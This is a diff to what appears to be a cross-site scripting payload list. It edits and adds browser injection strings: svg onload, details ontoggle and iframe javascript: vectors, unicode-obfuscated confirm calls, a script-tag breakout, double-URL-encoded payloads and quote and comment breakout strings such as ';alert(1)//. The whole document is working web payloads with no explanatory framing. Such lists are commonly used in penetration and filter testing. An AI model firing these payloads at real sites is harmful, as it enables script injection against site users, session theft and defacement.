@@ -22,7 +22,14 @@ co\u006efirm()
 <details open ontoggle=alert()>
 <svg/onload=confirm()>
 <iframe/src=javascript:alert(1)>
-<script>confirm()</script>
+</script><script>confirm()</script>
 <svg onload=confirm()//
 <svg onload=z=co\u006efir\u006d,z()>
 <object data=javascript:confirm()>
+%253Csvg%252Fonload%253Dconfirm%2528%2529%253E
+%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
+;alert(1);
+[0x0a]alert(1)//
+*/alert(1)//
+';alert(1)//
+&apos;-alert(1)-&apos;
